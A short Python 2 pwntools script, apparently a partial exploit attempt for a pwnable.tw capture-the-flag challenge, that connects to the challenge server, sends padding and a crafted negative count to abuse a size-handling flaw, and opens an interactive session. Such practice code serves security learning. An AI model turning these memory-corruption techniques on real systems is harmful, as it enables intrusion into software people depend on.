#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10101)

r.recvuntil('name :')
r.send('a'*100)
r.recvuntil('sort :')
n = -2**32+3
r.sendline(str(n))
print n
#sleep(0.5)
#raw_input('@')

numbers = ''
for i in xrange(2**32+n):
	numbers += str(i)+' '

print numbers
r.sendline(numbers)

r.interactive()

